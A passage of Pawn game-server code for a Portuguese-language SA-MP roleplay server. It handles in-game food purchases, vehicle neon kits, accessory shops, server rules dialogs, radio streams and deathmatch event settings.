	                sGivePlayerCash(playerid, - 40);
					SetPlayerHealth(playerid, pVida + 30.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 3:
	            {
	             	if(GetPlayerCash(playerid) < 80)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$80)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 50.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um Sundae Chocolate!");
	                    sGivePlayerCash(playerid, - 80);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um Sundae Chocolate!");
	                sGivePlayerCash(playerid, - 80);
					SetPlayerHealth(playerid, pVida + 30.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 4:
	            {
	             	if(GetPlayerCash(playerid) < 80)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$80)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 50.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um Sundae Morango!");
	                    sGivePlayerCash(playerid, - 80);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um Sundae Morango!");
	                sGivePlayerCash(playerid, - 80);
					SetPlayerHealth(playerid, pVida + 30.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 5:
	            {
	             	if(GetPlayerCash(playerid) < 80)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$80)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 50.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um Sundae Misto!");
	                    sGivePlayerCash(playerid, - 80);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um Sundae Misto!");
	                sGivePlayerCash(playerid, - 80);
					SetPlayerHealth(playerid, pVida + 30.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
			}
		}
	}
	if(dialogid == D_ALGOD)
	{
        if(response)
        {
	        switch(listitem)
	        {
	 			case 0:
	            {
	             	if(GetPlayerCash(playerid) < 20)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$20)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 10.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um algodão doce azul!");
	                    sGivePlayerCash(playerid, - 20);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um algodão doce azul!");
	                sGivePlayerCash(playerid, - 20);
					SetPlayerHealth(playerid, pVida + 10.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 1:
	            {
	             	if(GetPlayerCash(playerid) < 20)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$20)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 10.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um algodão doce rosa!");
	                    sGivePlayerCash(playerid, - 20);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um algodão doce rosa!");
	                sGivePlayerCash(playerid, - 20);
					SetPlayerHealth(playerid, pVida + 10.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 2:
	            {
	             	if(GetPlayerCash(playerid) < 20)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$20)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 10.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um algodão doce verde!");
	                    sGivePlayerCash(playerid, - 20);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um algodão doce verde!");
	                sGivePlayerCash(playerid, - 20);
					SetPlayerHealth(playerid, pVida + 10.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 3:
	            {
	             	if(GetPlayerCash(playerid) < 20)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$20)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 10.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um algodão doce amarelo!");
	                    sGivePlayerCash(playerid, - 20);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um algodão doce amrelo!");
	                sGivePlayerCash(playerid, - 20);
					SetPlayerHealth(playerid, pVida + 10.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
	            case 4:
	            {
	             	if(GetPlayerCash(playerid) < 20)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro o suficiente! (Custo: R$20)");
	                    return 1;
	                }
	                if(pVida >= 100.0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Você não pode comer nada pois você está de barriga cheia!");
	                    return 1;
	                }
	                if(pVida + 10.0 > 100.0)
	                {
	                    SendClientMessage(playerid, COR_AMARELO, "Você comprou um algodão doce branco!");
	                    sGivePlayerCash(playerid, - 20);
	                    SetPlayerHealth(playerid, 100.0);
	                    ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
	                    return 1;
	                }
	                SendClientMessage(playerid, COR_AMARELO, "Você comprou um algodão doce branco!");
	                sGivePlayerCash(playerid, - 20);
					SetPlayerHealth(playerid, pVida + 10.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
					return 1;
	            }
			}
		}
	}
	if(dialogid == 8899)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(WE_GetInt(f(playerid), "KitAzul") == 0 && pInfo[playerid][PLAYER_VIP] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não tem neon azul!");
			        return 1;
			    }
			    resetNeon(playerid);
				//blue
				SetPVarInt(playerid, "Status", 1);
            	SetPVarInt(playerid, "neon", CreateDynamicObject(18648,0,0,0,0,0,0));
            	SetPVarInt(playerid, "neon1", CreateDynamicObject(18648,0,0,0,0,0,0));
            	AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
            	AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
   			}
			if(listitem == 1)
			{
 			    if(WE_GetInt(f(playerid), "KitVermelho") == 0 && pInfo[playerid][PLAYER_VIP] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não tem neon vermelho!");
			        return 1;
			    }
			    resetNeon(playerid);
			 	//red
				SetPVarInt(playerid, "Status", 1);
	            SetPVarInt(playerid, "neon2", CreateDynamicObject(18647,0,0,0,0,0,0));
	            SetPVarInt(playerid, "neon3", CreateDynamicObject(18647,0,0,0,0,0,0));
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon2"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon3"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	            SendClientMessage(playerid, 0xFFFFFFAA, "Neon Instalado");
			}
			if(listitem == 2)
			{
 			    if(WE_GetInt(f(playerid), "KitVerde") == 0 && pInfo[playerid][PLAYER_VIP] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não tem neon verde!");
			        return 1;
			    }
			    resetNeon(playerid);
				//green
		   	   	SetPVarInt(playerid, "Status", 1);
	            SetPVarInt(playerid, "neon4", CreateDynamicObject(18649,0,0,0,0,0,0));
	            SetPVarInt(playerid, "neon5", CreateDynamicObject(18649,0,0,0,0,0,0));
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon4"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon5"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	            SendClientMessage(playerid, 0xFFFFFFAA, "Neon Instalado");
	  		}
			if(listitem == 3)
			{
 			    if(WE_GetInt(f(playerid), "KitBranco") == 0 && pInfo[playerid][PLAYER_VIP] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não tem neon branco!");
			        return 1;
			    }
			    resetNeon(playerid);
				//white
		   	   	SetPVarInt(playerid, "Status", 1);
	            SetPVarInt(playerid, "neon6", CreateDynamicObject(18652,0,0,0,0,0,0));
	            SetPVarInt(playerid, "neon7", CreateDynamicObject(18652,0,0,0,0,0,0));
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon6"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon7"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	            SendClientMessage(playerid, 0xFFFFFFAA, "Neon Instalado");
			}
			if(listitem == 4)
			{
 			    if(WE_GetInt(f(playerid), "KitRosa") == 0 && pInfo[playerid][PLAYER_VIP] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não tem neon rosa!");
			        return 1;
			    }
			    resetNeon(playerid);
				//pink
		   	   	SetPVarInt(playerid, "Status", 1);
	            SetPVarInt(playerid, "neon8", CreateDynamicObject(18651,0,0,0,0,0,0));
	            SetPVarInt(playerid, "neon9", CreateDynamicObject(18651,0,0,0,0,0,0));
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon8"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon9"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	            SendClientMessage(playerid, 0xFFFFFFAA, "Neon Instalado");
			}
			if(listitem == 5)
			{
 			    if(WE_GetInt(f(playerid), "KitAmarelo") == 0 && pInfo[playerid][PLAYER_VIP] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não tem neon amarelo!");
			        return 1;
			    }
			    resetNeon(playerid);
				//yellow
  				SetPVarInt(playerid, "Status", 1);
	            SetPVarInt(playerid, "neon10", CreateDynamicObject(18650,0,0,0,0,0,0));
	            SetPVarInt(playerid, "neon11", CreateDynamicObject(18650,0,0,0,0,0,0));
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon10"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon11"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	            SendClientMessage(playerid, 0xFFFFFFAA, "Neon Instalado");
			}
			if(listitem == 6)
			{
				//remove neon
	            resetNeon(playerid);
			}
		}
	}
 	if(dialogid == 8810)
	{
		if(response)
		{
	      	if(listitem == 0)
			{
			    resetNeon(playerid);
	            //undercover
	            SetPVarInt(playerid, "Status", 1);
	            SetPVarInt(playerid, "undercover", CreateDynamicObject(18646,0,0,0,0,0,0));
	            SetPVarInt(playerid, "undercover1", CreateDynamicObject(18646,0,0,0,0,0,0));
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "undercover"), GetPlayerVehicleID(playerid), -0.5, -0.2, 0.8, 2.0, 2.0, 3.0);
	            AttachDynamicObjectToVehicle(GetPVarInt(playerid, "undercover1"), GetPlayerVehicleID(playerid), -0.5, -0.2, 0.8, 2.0, 2.0, 3.0);
	            SendClientMessage(playerid, VERMELHO_WE, "Sirene adicional instalada");
	     	}
			if(listitem == 1)
			{
				//remove neon
	            resetNeon(playerid);
			}
		}
	}
	if(dialogid == D_ITEN1)
	{
	    if(response)
	    {
	        if(GetPlayerCash(playerid) < 1000)
	        {
	            SendClientMessage(playerid, 0xFF0000AA, "Você não tem R$1000 para comprar esse óculos!");
	            return 1;
	        }
	        format(gStr, sizeof(gStr), "Você adquiriu o óculos ID %d, Use: /usarOculos %d", useOculos[playerid], useOculos[playerid]);
	        SendClientMessage(playerid, -1, gStr);
	        new
				oOculos[24]
			;
			format(oOculos, sizeof(oOculos), "Oculos%d", useOculos[playerid]);
	        WE_SetInt(f(playerid), oOculos, 1);
	        useOculos[playerid] = -1, useTipo[playerid] = 0;
	        RemovePlayerAttachedObject(playerid, 1);
	        SetarItensPlayer(playerid);
	        sGivePlayerCash(playerid, -1000);
	        return 1;
	    }
	    if(!response)
	    {
	        useOculos[playerid] = -1, useTipo[playerid] = 0;
	        RemovePlayerAttachedObject(playerid, 1);
	        SetarItensPlayer(playerid);
	        return 1;
	    }
	}
	if(dialogid == D_ITEN2)
	{
	    if(response)
	    {
	        if(GetPlayerCash(playerid) < 2000)
	        {
	            SendClientMessage(playerid, 0xFF0000AA, "Você não tem R$2000 para comprar essa máscara!");
	            return 1;
	        }
	        format(gStr, sizeof(gStr), "Você adquiriu à máscara ID %d, Use: /usarMascara %d", useMascara[playerid], useMascara[playerid]);
	        SendClientMessage(playerid, -1, gStr);
	        new
				aMascara[24]
			;
			format(aMascara, sizeof(aMascara), "Mascara%d", useMascara[playerid]);
	        WE_SetInt(f(playerid), aMascara, 1);
	        useMascara[playerid] = -1, useTipo[playerid] = 0;
            RemovePlayerAttachedObject(playerid, 2);
            SetarItensPlayer(playerid);
            sGivePlayerCash(playerid, -2000);
	        return 1;
	    }
	    if(!response)
	    {
	        useMascara[playerid] = -1, useTipo[playerid] = 0;
	        RemovePlayerAttachedObject(playerid, 2);
	        SetarItensPlayer(playerid);
	        return 1;
	    }
	}
	if(dialogid == D_ITEN4)
	{
	    if(response)
	    {
	        if(GetPlayerCash(playerid) < 500)
	        {
	            SendClientMessage(playerid, 0xFF0000AA, "Você não tem R$500 para comprar esse chapéu!");
	            return 1;
	        }
	        format(gStr, sizeof(gStr), "Você adquiriu o chapéu ID %d, Use: /usarChapeu %d", useChapeu[playerid], useChapeu[playerid]);
	        SendClientMessage(playerid, -1, gStr);
	        new
				oChapeu[24]
			;
			format(oChapeu, sizeof(oChapeu), "Chapeu%d", useChapeu[playerid]);
	        WE_SetInt(f(playerid), oChapeu, 1);
	        useChapeu[playerid] = -1, useTipo[playerid] = 0;
	        RemovePlayerAttachedObject(playerid, 4);
	        SetarItensPlayer(playerid);
	        sGivePlayerCash(playerid, -500);
	        return 1;
	    }
	    if(!response)
	    {
	        useChapeu[playerid] = -1, useTipo[playerid] = 0;
	        RemovePlayerAttachedObject(playerid, 4);
	        SetarItensPlayer(playerid);
	        return 1;
	    }
	}
	/*if(dialogid == D_SPORG)
	{
	    if(response)
	    {
	        SpawnOrg(playerid, oInfo[playerid][ORG_ID]);
	    }
        else if(!response)
        {
			if(pInfo[playerid][Spawn] == 1)
			{
				SpawnCasa(playerid);
			}
			else
			{
				SpawnProf(playerid);
			}
		}
		return 1;
	}*/
 	if(dialogid == D_BALAO)
	{
		if(response)
		{
			if(listitem == 0) // Comandos
			{
				ShowPlayerDialog(playerid, 4457, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Balão Comandos", "\tAlt + Y - Move para cima\n\tAlt + N - Move para baixo\n\tF + Y - Move para frente\n\tF + N - Move para tráz\n\tC + Y - Move para direita\n\tC + Y - Move para esquerda", "OK", "");
				return 1;
	        }
			if(listitem == 1) // Modelo
			{//Modelo ID 19333\nModelo ID 19334\nModelo ID 19335\nModelo ID 19332\nModelo ID 19336\nModelo ID 19337\nModelo ID 19338
				//ShowPlayerDialog(playerid, D_BALA2, DIALOG_STYLE_LIST, "Modelo Balão", "Modelo ID 1\nModelo ID 2\nModelo ID 3\nModelo ID 4\nModelo ID 5\nModelo ID 6\nModelo ID 7", "Escolher", "Voltar");
				ShowPlayerDialog(playerid, 4457, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Aviso", "{FF0000}Em desenvolvimento", "OK", "");
	        }
	        if(listitem == 2) // Velocidade
			{
				//ShowPlayerDialog(playerid, D_BALA3, DIALOG_STYLE_LIST, "Velocidade Balão", "Velocidade Lenta\nVelocidade Normal\nVelocidade Rápida", "Escolher", "Voltar");
				ShowPlayerDialog(playerid, 4457, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Aviso", "{FF0000}Em desenvolvimento", "OK", "");
	        }
	        if(listitem == 3) // Mensagem
	        {
				//format(gStr, sizeof(gStr), " Coloque abaixo a mensagem de seu balão:");
	        	//ShowPlayerDialog(playerid, D_BALA4, DIALOG_STYLE_MSGBOX, "Mensagem Balão", gStr, "OK", "Voltar");
	        	ShowPlayerDialog(playerid, 4457, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Aviso", "{FF0000}Em desenvolvimento", "OK", "");
	        }
	        if(listitem == 4) // Respawn
	        {
	            SendClientMessage(playerid, COR_AMARELO, "Balão respawnado!");
	            new
	                iBalaoID = WE_GetInt(f(playerid), "Balao")
				;
				SetDynamicObjectPos(bInfo[iBalaoID][BalaoID], bInfo[iBalaoID][posBOX], bInfo[iBalaoID][posBOY], bInfo[iBalaoID][posBOZ]);
				bInfo[iBalaoID][posBalaoX] = bInfo[iBalaoID][posBOX];
				bInfo[iBalaoID][posBalaoY] = bInfo[iBalaoID][posBOY];
				bInfo[iBalaoID][posBalaoZ] = bInfo[iBalaoID][posBOZ];
				ShowPlayerDialog(playerid, 4457, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Balão Respawn", "{1E90FF}Balão respawnado com sucesso", "OK", "");
	        }
		}
	}
	if(dialogid == 1448)
	{
		if(!response)
		{
			new
		        stg[1500]
			;
			format(gstring, sizeof(gstring), "{1E90FF} Jamais peça itens ou teleporte a equipe {FF1E1E}WE{1E90FF}. O(a) administrador(a)/moderador(a) que for pego");
			strcat(stg, gstring);
			format(gstring, sizeof(gstring), "\n{1E90FF}auxiliando um membro com teleportes ou dando itens sem a necessidade, será alertado.");
			strcat(stg, gstring);
			format(gstring, sizeof(gstring), "\n\n{FF1E1E} Não é permitido ter múltiplas contas (mais de uma conta por jogador), mesmo em situações");
			strcat(stg, gstring);
			format(gstring, sizeof(gstring), "\n{FF1E1E}de banimentos ou punições, aquele que for pego com mais de uma conta será banido imediatamente.");
			strcat(stg, gstring);
			format(gstring, sizeof(gstring), "\n\n{1E90FF} Jamais compartilhe seus dados com outra pessoa, nem mesmo com a equipe {FF1E1E}WE {1E90FF}(exceto desenvolvedores),");
			strcat(stg, gstring);
			format(gstring, sizeof(gstring), "\n{1E90FF}pois se o mesmo quebrar regras usando sua conta, você será punido sem porém.");
			strcat(stg, gstring);
			format(gstring, sizeof(gstring), "\n\n{FF1E1E} Clientes da nossa loja online e VIPs em nenhuma circunstância terão algum tipo de vantagem sob as regras.");
			strcat(stg, gstring);
	   		format(gstring, sizeof(gstring), "\n\n{1E90FF} Caso aviste um jogador quebrando algum regra citada aqui ou no fórum, denuncie em nosso fórum ou a Equipe {FF1E1E}WE{1E90FF} online, não anuncie no chat.");
	   		strcat(stg, gstring);
			format(gstring, sizeof(gstring), "\n\n\n{1E90FF} Para mais informações e regras policiais, acesse: forumwe.vivagamesonline.com");
			strcat(stg, gstring);
			ShowPlayerDialog(playerid, 1449, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Regras Básicas - World Evolution RPG ", stg, "OK", "Voltar");
		}
		return 1;
	}
	if(dialogid == 1449)
	{
		if(!response)
		{
			new
		        stg[1500]
			;
		    format(gstring, sizeof(gstring), "{1E90FF} Jamais cometa DM (Homicídio sem motivo) em locais públicos e interiores,");
	        strcat(stg, gstring);
	        format(gstring, sizeof(gstring), "\n{1E90FF}sendo eles: Agências de empregos, bancos, prefeituras, hospitais, spawn de profissões, dentre outros.");
	        strcat(stg, gstring);
		    format(gstring, sizeof(gstring), "\n\n{FF1E1E} Drive-by (atirar de um veículo contra um(a) jogador(a) apé) é proibido, sendo assim");
        	strcat(stg, gstring);
        	format(gstring, sizeof(gstring), "\n{FF1E1E}aquele que cometer a infração citada será devidamente punido. (OBS. Atirar de veículo contra veículo é permitido)");
	        strcat(stg, gstring);
	        format(gstring, sizeof(gstring), "\n\n{1E90FF} O insulto, desrespeito e racismo é proibido e totalmente intolerável, sempre procure respeitar e aceitar.");
	        strcat(stg, gstring);
        	format(gstring, sizeof(gstring), "\n\n{FF1E1E} Não peça um cargo na Equipe {1E90FF}WE{FF1E1E}, quanto mais insistir, menos será sua chance de conseguir uma vaga,");
        	strcat(stg, gstring);
	        format(gstring, sizeof(gstring), "\n{FF1E1E}caso queira fazer parte da mesma, seja honesto, humilde, ajude os outros jogadores e procure manter a ordem.");
        	strcat(stg, gstring);
        	format(gstring, sizeof(gstring), "\n\n{1E90FF} O uso de cheater e programas que lhe dê vantagens é totalmente proibido, sujeito a banimento permanente.");
	        strcat(stg, gstring);
		    ShowPlayerDialog(playerid, 1448, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Regras Básicas - World Evolution RPG ", stg, "OK", "Avançar");
		    return 1;
		}
	}
	if(dialogid == D_RADIOS)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            PlayAudioStreamForPlayer(playerid, "http://streaming.radionomy.com/EvaRadio");
	            SendClientMessage(playerid, -1, " Rádio {1E90FF}EvaRadio{FFFFFF} selecionada.");
			}
	        if(listitem == 1)
	        {
	            PlayAudioStreamForPlayer(playerid, "http://209.105.238.75:7060/");
	            SendClientMessage(playerid, -1, " Rádio {1E90FF}Queen 24/7{FFFFFF} selecionada.");
			}
	        if(listitem == 2)
	        {
	            PlayAudioStreamForPlayer(playerid, "http://streaming.radionomy.com/TheBeatlesHQ");
	            SendClientMessage(playerid, -1, " Rádio {1E90FF}The Beatles HQ{FFFFFF} selecionada.");
			}
	        if(listitem == 3)
	        {
	            PlayAudioStreamForPlayer(playerid, "http://streaming.radionomy.com/80sMixTape");
	            SendClientMessage(playerid, -1, " Rádio {1E90FF}80sMixTapes{FFFFFF} selecionada.");
			}
 	        if(listitem == 4)
	        {
	            PlayAudioStreamForPlayer(playerid, "http://streaming.radionomy.com/OneDirectionTheRadio");
	            SendClientMessage(playerid, -1, " Rádio {1E90FF}One Direction The Radio{FFFFFF} selecionada.");
			}
	        if(listitem == 5)
	        {
	            StopAudioStreamForPlayer(playerid);
	            SendClientMessage(playerid, -1, " Rádio desligada.");
			}
		}
	}
	//
	if(dialogid == D_DMEVENT)
    {
        if(response)
        {
	        if(listitem == 0) // Arena
	        {
	        	if(esDM[evdmArenaIDDF] == 1)
	            {
	                format(gStr, 128, "{FFFFFF}Arena já definida {FF8115}Arena ID %d", esDM[evdmArenaID]);
					ShowPlayerDialog(playerid, D_DMEVENT+16, DIALOG_STYLE_MSGBOX, "Arena Definida", gStr, "OK", "Redefinir");
	                return 0;
	            }
	            ShowPlayerDialog(playerid, D_DMEVENT+1, DIALOG_STYLE_LIST, "Definir Arena", "Arena ID 1\nArena ID 2\nArena ID 3\nArena ID 4\nArena ID 5\nLocal Atual", "Definir", "Voltar");
			}
	        if(listitem == 1) // Arma ID
	        {
	            if(esDM[evdmArmaPKDF] == 1)
	            {
	                format(gStr, 128, "{FF0000}O Pack de armas{FFFFFF}ID %d{FF0000} está definido!\nDeseja redefinir para armas por ID?", esDM[evdmArmaPK]);
					ShowPlayerDialog(playerid, D_DMEVENT+19, DIALOG_STYLE_MSGBOX, "Armas Definida", gStr, "Redefinir", "Voltar");
	                return 0;
	            }
	            ShowPlayerDialog(playerid, D_DMEVENT+3, DIALOG_STYLE_LIST, "Definir Armas", "Arma 1\nArma 2\nArma 3", "Definir", "Voltar");
			}
	        if(listitem == 2) // Arma Pack
	        {
	            if(esDM[evdmArmaIDDF][0] == 1 && esDM[evdmArmaIDDF][1] == 1 && esDM[evdmArmaIDDF][2] == 1)
	            {
					ShowPlayerDialog(playerid, D_DMEVENT+20, DIALOG_STYLE_MSGBOX, "Armas Definida", "{FF000}Já está definido para o evento armas por ID!\nDeseja redefinir para armas por Pack?", "Redefinir", "Voltar");
	                return 0;
	            }
		        format(s5Doze, 512, "Pack 1 (M4/Sniper/Uzzie/Sawnoff/Taco de baseball)\nPack 2 (Tec/Sawnoff/Eagle/Faca/AK-47)\nPack 3 (Ak47/Cassetete/9mm/MP5)\nPack 4 (Extinto/Pá/9mm com S)\nPack 5 (Minigun/Extintor/Satchel Charge/Detonator)");
				ShowPlayerDialog(playerid, D_DMEVENT+18, DIALOG_STYLE_LIST, "Definir Armas Pack", s5Doze, "Definir", "Voltar");
			}
			if(listitem == 3) // Tempo
	        {
	        	ShowPlayerDialog(playerid, D_DMEVENT+10, DIALOG_STYLE_INPUT, "Definir Tempo", "{FFFFFF}Digite abaixo o tempo do evento:", "Definir", "Voltar");
	        }
	        if(listitem == 4) // Colete
	        {
	            if(esDM[evdmColeteDF] != 0 && esDM[evdmColeteDF] == 1 || esDM[evdmColeteDF] == 2)
	            {
	                new
						colName[24]
					;
					if(esDM[evdmColeteDF] == 1)
					{
					    colName = "{48FF00}com";
					}
					else if(esDM[evdmColeteDF]  == 2)
					{
					    colName = "{FF0000}sem";
					}
	                format(gStr, 128, "{FFFFFF}Evento definido %s {FFFFFF}colete.", colName);
	                ShowPlayerDialog(playerid, D_DMEVENT+13, DIALOG_STYLE_MSGBOX, "Definir Colete", gStr, "OK", "Redefinir");
	                return 0;
	            }
	        	ShowPlayerDialog(playerid, D_DMEVENT+12, DIALOG_STYLE_LIST, "Definir Colete", "\nCom colete\nSem colete", "Definir", "Voltar");
			}
	        if(listitem == 5) // Prêmio
	        {
	        	ShowPlayerDialog(playerid, D_DMEVENT+14, DIALOG_STYLE_INPUT, "Definir Prêmio", "Digite abaixo o prêmio do evento:", "Definir", "Voltar");
	        }
	        if(listitem == 6) // Top
			{
			    if(esDM[evdmTopDF] == 1)
			    {
			        format(gStr, 128, "{FFFFFF}Top já definido para top {00FF00}%d\n{FFFFFF}Deseja redefinir?", esDM[evdmTop]);
			        ShowPlayerDialog(playerid, D_DMEVENT+24, DIALOG_STYLE_MSGBOX, "Top Definido", gStr, "OK", "Redefinir");
			        return 0;
	        	}
	        	ShowPlayerDialog(playerid, D_DMEVENT+23, DIALOG_STYLE_LIST, "Definir Top", "Top 1\nTop 2\nTop 3\nTop 4\nTop 5\nTop 6\nTop 7\nTop 8\nTop 9\nTop 10", "Definir", "Voltar");
	        }
	        if(listitem == 7) // Carregar
	        {
	            if(esDM[evdmCarregado] == 1)
	            {
	                SendClientMessage(playerid, COR_ERRO, "O evento 'atual', já está carregado!");
     				ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Editar", "Fechar");
	                return 1;
	            }
	            evDMcarregar(playerid);
	        }
	        if(listitem == 8) // Liberar
	        {
   				if(esDM[evdmCarregado] == 0)
	            {
